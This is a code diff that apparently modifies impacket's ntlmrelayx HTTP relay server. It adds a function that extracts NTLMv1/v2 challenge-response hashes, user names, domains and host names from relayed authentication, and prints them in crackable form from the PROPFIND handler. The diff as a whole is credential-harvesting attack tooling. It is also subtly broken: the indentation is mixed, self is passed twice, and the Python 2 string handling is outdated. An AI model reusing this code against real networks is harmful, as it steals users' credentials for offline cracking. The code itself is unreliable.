@@ -128,7 +128,41 @@ class HTTPRelayServer(Thread):
             self.send_header('Connection', 'close')
             self.end_headers()
             return
+        
+        # Parse NTLMv1/v2 hash with challengeMessage & token * custom *
+	    # check out responder ParseSMBHash to implement for smbrelayserver.py
+        # replace impacket/impacket/examples/ntlmrelayx/servers/httprelayserver.py
+        def ParseHTTPHash(self,client,data):
+            LMhashLen    = struct.unpack('<H',data[12:14])[0]
+            LMhashOffset = struct.unpack('<H',data[16:18])[0]
+            LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+            
+            NthashLen    = struct.unpack('<H',data[20:22])[0]
+            NthashOffset = struct.unpack('<H',data[24:26])[0]
+            NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+            
+            UserLen      = struct.unpack('<H',data[36:38])[0]
+            UserOffset   = struct.unpack('<H',data[40:42])[0]
+            User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')
+            NumChal = self.challengeMessage['challenge'].encode("hex")
 
+            if NthashLen == 24:
+                HostNameLen     = struct.unpack('<H',data[46:48])[0]
+                HostNameOffset  = struct.unpack('<H',data[48:50])[0]
+                HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
+                WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, NumChal)
+    
+            if NthashLen > 24:
+                NthashLen      = 64
+                DomainLen      = struct.unpack('<H',data[28:30])[0]
+                DomainOffset   = struct.unpack('<H',data[32:34])[0]
+                Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
+                HostNameLen    = struct.unpack('<H',data[44:46])[0]
+                HostNameOffset = struct.unpack('<H',data[48:50])[0]
+                HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
+                WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, NumChal, NTHash[:32], NTHash[32:])
+            return WriteHash
+        
         def do_PROPFIND(self):
             proxy = False
             if (".jpg" in self.path) or (".JPG" in self.path):
@@ -166,7 +200,9 @@ class HTTPRelayServer(Thread):
                         authenticateMessage['user_name'].decode('ascii')))
                 self.do_ntlm_auth(token, authenticateMessage)
                 self.do_attack()
-
+                
+		        # ntlm hash print * custom *
+                print(self.ParseHTTPHash(self,str(token)))
 
                 self.send_response(207, "Multi-Status")
                 self.send_header('Content-Type', 'application/xml')
